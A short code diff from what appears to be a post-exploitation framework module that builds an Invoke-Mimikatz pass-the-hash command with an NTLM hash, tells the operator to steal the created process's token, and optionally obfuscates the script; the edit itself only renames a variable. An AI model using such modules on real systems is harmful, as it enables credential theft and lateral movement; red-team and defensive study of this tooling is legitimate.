@@ -61,9 +61,9 @@ class Module(object):
         command += " /ntlm:" + params["ntlm"]
 
         # base64 encode the command to pass to Invoke-Mimikatz
-        scriptEnd = "Invoke-Mimikatz -Command '\"" + command + "\"'"
+        script_end = "Invoke-Mimikatz -Command '\"" + command + "\"'"
 
-        scriptEnd += ';"`nUse credentials/token to steal the token of the created PID."'
+        script_end += ';"`nUse credentials/token to steal the token of the created PID."'
 
         if main_menu.obfuscate:
             script_end = data_util.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=main_menu.obfuscateCommand)
